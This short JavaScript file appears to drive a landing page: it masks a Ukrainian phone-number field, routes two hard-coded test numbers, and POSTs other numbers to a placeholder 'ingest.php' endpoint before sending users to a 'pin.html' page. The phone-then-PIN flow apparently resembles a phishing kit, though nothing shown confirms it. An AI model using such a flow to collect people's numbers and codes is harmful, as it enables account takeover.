var landing = {
  init: function () {
    this.inputMask();
    this.submitForm();
  },

  inputMask: function () {
    const phoneInput = document.querySelector("#phone");

    phoneInput.addEventListener("input", (e) => {
      let input = e.target;
      let matrix = "+(38_) ___-___-__";
      let i = 0;
      let def = matrix.replace(/\D/g, "");
      let val = input.value.replace(/\D/g, "");

      if (def.length >= val.length) val = def;

      input.value = matrix.replace(/./g, function (a) {
        if ((a === "_" || /\d/.test(a)) && i < val.length) {
          return val.charAt(i++);
        } else if (i >= val.length) {
          return "";
        } else {
          return a;
        }
      });
    });

    phoneInput.addEventListener("focus", (e) => {
      if (e.target.value.length < 4) {
        e.target.value = "+38 ";
      }
    });
  },

  submitForm: function () {
    const form = document.querySelector("#form");
    const labelError = document.querySelector(".label__phone");
    const phoneInput = document.querySelector("#phone");
    const sendData = this.sendData

    form.addEventListener("submit", function (e) {
      e.preventDefault();
      const phone = phoneInput.value.replace(/[^\d+]/g, "");
      console.log(phone)

      switch (phone) {
        case "+38111111111":
          window.location.href = "pin.html";
          break;
        case "+38000000000":
          labelError.classList.add("error");
          phoneInput.classList.add("error");
          break;
        default:
          sendData(phone);
      }
    });
  },

  sendData: function(data) {
      const queryString = window.location.search;
      const urlParams = new URLSearchParams(queryString);
      const test = urlParams.get("test");
      const test2 = urlParams.get("test2");

      const options = {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(data),
      };

      if (test && test2) {
        window.location.href = `pin.html?test=${test}&test2=${test2}`;
      } else {
        fetch("https://domain.test/ingest.php", options)
          .then((response) => response.json())
          .then((data) => console.log(data));
      }
    }
};

document.addEventListener("DOMContentLoaded", function () {
  landing.init();
});
